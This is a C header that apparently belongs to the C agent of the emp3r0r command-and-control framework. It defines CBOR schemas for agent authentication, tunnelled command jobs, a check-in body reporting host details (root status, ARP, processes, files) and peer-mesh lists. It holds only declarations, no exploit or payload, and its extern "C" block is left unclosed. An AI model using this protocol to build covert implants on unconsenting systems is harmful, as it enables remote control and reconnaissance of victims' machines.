#ifndef C2_MESSAGES_H
#define C2_MESSAGES_H

/*
 * messages.h — the C2 message schemas.
 *
 * Every message is a CBOR map with integer keys. Strings and byte strings are
 * borrowed slices (see common.h): decode points into the source buffer,
 * encode points at caller memory. No function here allocates.
 *
 * The structs are a transcription of the Go definitions in
 * core/internal/def/{msg_auth,agent,token}.go. The key enums MUST match.
 */

#include "common.h"

#include "cbor.h"
#include "crypto.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Caller-provided list of borrowed strings. Set items/cap before decode or
 * encode; count is set by decode and read by encode. */
typedef struct {
  c2_str *items;
  size_t count;
  size_t cap;
} c2_str_list;

/* ------------------------------------------------------------------------- */
/* MsgAuth (CBOR keys 11..19; keys 18, 20 retired)                           */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_AUTH_TYPE = 11,           /* text  must be C2_MSGAUTH_TYPE      */
  C2_KEY_AUTH_AGENT_UUID = 12,     /* text                               */
  C2_KEY_AUTH_IDENTITY_TOKEN = 13, /* bytes CA signature over UUID       */
  C2_KEY_AUTH_TIMESTAMP = 14,      /* int   unix seconds                 */
  C2_KEY_AUTH_NONCE = 15,          /* text  fresh, anti-replay           */
  C2_KEY_AUTH_ROUTE = 16,          /* text  exactly one route name       */
  C2_KEY_AUTH_AGENT_PROOF = 17,    /* bytes ECDSA DER signature          */
  C2_KEY_AUTH_STREAM_ID = 19,      /* text  optional                     */
};

typedef struct {
  c2_str type;
  c2_str agent_uuid;
  c2_bytes identity_token;
  int64_t timestamp;
  c2_str nonce;
  c2_str route;
  c2_bytes agent_proof;
  c2_str stream_id;
} c2_msgauth;

/*
 * Build the canonical auth string that AgentProof signs:
 *
 *   AgentUUID "\n" decimal(Timestamp) "\n" Nonce "\n" Route
 *
 * Writes a NUL byte after the string when there is room. Returns C2_ERR_NOMEM
 * if it does not fit.
 */
c2_status c2_auth_canonical(c2_str agent_uuid, int64_t timestamp, c2_str nonce,
                            c2_str route, char *out, size_t out_cap,
                            size_t *out_len);

/* Encode a MsgAuth map. `m->type` is emitted as-is; the caller sets it. */
c2_status c2_msgauth_encode(CborEncoder *w, const c2_msgauth *m);

/* Decode a MsgAuth map (the C agent normally only encodes it). */
c2_status c2_msgauth_decode(CborValue *r, c2_msgauth *m);

/* ------------------------------------------------------------------------- */
/* MsgTunData (CBOR keys 1..5, 8, 10, 11; keys 6, 7, 9 retired)          */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_TUN_JOB_ID = 1,       /* text                               */
  C2_KEY_TUN_CMD_SLICE = 2,    /* array of text                      */
  C2_KEY_TUN_RESPONSE = 3,     /* bytes                              */
  C2_KEY_TUN_TAG = 4,          /* text                               */
  C2_KEY_TUN_TIME = 5,         /* int64 Unix milliseconds           */
  C2_KEY_TUN_EPHEM_PUBLIC = 8, /* bytes agent ephemeral X||Y         */
  C2_KEY_TUN_PEER_LIST = 10,   /* map (PeerList)             */
  C2_KEY_TUN_AGENT_TOKEN = 11, /* map (AgentToken; C agent skips it) */
};

typedef struct c2_peer c2_peer;

typedef struct {
  c2_peer *peers;
  size_t count;
  size_t cap;
} c2_peer_list;

typedef struct {
  c2_str job_id;
  c2_str_list cmd_slice;
  c2_bytes response;
  c2_str tag;
  int64_t time;
  c2_bytes ephem_public_key;
  c2_peer_list *peer_list; /* NULL when absent */
} c2_msgtun;

c2_status c2_msgtun_encode(CborEncoder *w, const c2_msgtun *m);
c2_status c2_msgtun_decode(CborValue *r, c2_msgtun *m);

/*
 * True when the message is a hello: Response absent/empty AND CmdSlice has at
 * least one element. This mirrors the server's handshake detection exactly.
 */
static inline int c2_msgtun_is_hello(const c2_msgtun *m) {
  return m->response.len == 0 && m->cmd_slice.count > 0;
}

/* ------------------------------------------------------------------------- */
/* Emp3r0rAgent check-in body (keys 2..44; retired keys omitted)             */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_AGENT_NAME = 2,
  C2_KEY_AGENT_VERSION = 3,
  C2_KEY_AGENT_TRANSPORT = 4,
  C2_KEY_AGENT_HOSTNAME = 5,
  C2_KEY_AGENT_HARDWARE = 6,
  C2_KEY_AGENT_CONTAINER = 7,
  C2_KEY_AGENT_CPU = 8,
  C2_KEY_AGENT_GPU = 9,
  C2_KEY_AGENT_MEM = 10,
  C2_KEY_AGENT_OS = 11,
  C2_KEY_AGENT_GOOS = 12,
  C2_KEY_AGENT_KERNEL = 13,
  C2_KEY_AGENT_ARCH = 14,
  C2_KEY_AGENT_IPS = 16,
  C2_KEY_AGENT_ARP = 17,
  C2_KEY_AGENT_USER = 18,
  C2_KEY_AGENT_HAS_ROOT = 19,
  C2_KEY_AGENT_HAS_INTERNET = 21,
  C2_KEY_AGENT_NCSI_ENABLED = 22,
  C2_KEY_AGENT_PROCESS = 23,
  C2_KEY_AGENT_EXES = 24,
  C2_KEY_AGENT_CWD = 25,
  C2_KEY_AGENT_PRODUCT = 26,
  C2_KEY_AGENT_PUBLIC_KEY = 29,
  C2_KEY_AGENT_UPTIME = 33,
  C2_KEY_AGENT_GROUPS = 34,
  C2_KEY_AGENT_MESH_ROUTE = 37,
  C2_KEY_AGENT_P2P_RELAY_PORT = 38,
  C2_KEY_AGENT_MESH_GOSSIP_PORT = 39,
  C2_KEY_AGENT_FILES = 40,
  C2_KEY_AGENT_GOARCH = 41,
  C2_KEY_AGENT_P2P_TRANSPORT = 42,
  C2_KEY_AGENT_OFFLINE_GRACE = 44,
};

/* AgentProcess (nested map under C2_KEY_AGENT_PROCESS). */
enum {
  C2_KEY_PROCESS_PID = 1,
  C2_KEY_PROCESS_PPID = 2,
  C2_KEY_PROCESS_CMDLINE = 3,
  C2_KEY_PROCESS_PARENT = 4,
};

typedef struct {
  int has_pid;
  int64_t pid;
  int has_ppid;
  int64_t ppid;
  c2_str cmdline;
  c2_str parent;
} c2_agent_process;

/*
 * Emp3r0rAgent, flattened. Every field is optional except PublicKey. Unset
 * strings are encoded as absent when .ptr is NULL; set strings may be empty.
 * Integer/boolean fields are emitted only when their present flag is set.
 *
 * Identity (UUID/UUIDSig), Tag, From, LastSeen, Owner, C2Host and AgentToken
 * are not part of the check-in body: the server takes identity from MsgAuth and
 * derives the rest from the connection/session.
 */
typedef struct {
  c2_str name;
  c2_str version;
  c2_str transport;
  c2_str hostname;
  c2_str hardware;
  c2_str container;
  c2_str cpu;
  c2_str gpu;
  c2_str mem;
  c2_str os;
  c2_str goos;
  c2_str kernel;
  c2_str arch;
  c2_str_list ips;
  c2_str_list arp;
  c2_str user;

  int has_root;
  int root;
  int has_internet;
  int internet;
  int has_ncsi;
  int ncsi;

  c2_agent_process process;
  c2_str_list exes;
  c2_str cwd;
  c2_str product; /* JSON/text; leave unset for a minimal agent */

  c2_str public_key; /* PEM-encoded PKIX P-256 public key */

  c2_str uptime;
  c2_str groups;

  c2_str mesh_route;
  c2_str p2p_relay_port;
  c2_str mesh_gossip_port;
  c2_str_list files;
  c2_str goarch;
  c2_str p2p_transport;

  int has_offline_grace;
  int64_t offline_grace;
} c2_agent_info;

c2_status c2_agent_info_encode(CborEncoder *w, const c2_agent_info *a);
c2_status c2_agent_info_decode(CborValue *r, c2_agent_info *a);

/* ------------------------------------------------------------------------- */
/* AgentToken (CBOR keys 1..5)                                                */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_TOKEN_AGENT_ID = 1,
  C2_KEY_TOKEN_IP = 2,
  C2_KEY_TOKEN_CAPABILITY = 3,
  C2_KEY_TOKEN_EXPIRES_AT = 4,
  C2_KEY_TOKEN_SIGNATURE = 5,
};

typedef struct {
  c2_str agent_id;
  c2_str ip;
  c2_str capability;
  int64_t expires_at;
  c2_bytes signature;
} c2_agent_token;

c2_status c2_agent_token_decode(CborValue *r, c2_agent_token *t);

/* ------------------------------------------------------------------------- */
/* Peer / PeerList (CBOR keys 1..8)                           */
/* ------------------------------------------------------------------------- */

enum {
  C2_KEY_PEER_UUID = 1,
  C2_KEY_PEER_IPS = 2,
  C2_KEY_PEER_FROM = 3,
  C2_KEY_PEER_P2P_RELAY_PORT = 4,
  C2_KEY_PEER_MESH_GOSSIP_PORT = 5,
  C2_KEY_PEER_FILES = 6,
  C2_KEY_PEER_LAST_SEEN = 7,
  C2_KEY_PEER_P2P_TRANSPORT = 8,
};

enum {
  C2_KEY_PEER_LIST_PEERS = 1,
};

struct c2_peer {
  c2_str uuid;
  c2_str_list ips;
  c2_str from;
  c2_str p2p_relay_port;
  c2_str mesh_gossip_port;
  c2_str_list files;
  int64_t last_seen;
  c2_str p2p_transport;
};

c2_status c2_peer_list_decode(CborValue *r, c2_peer_list *l);

#endif /* C2_MESSAGES_H */
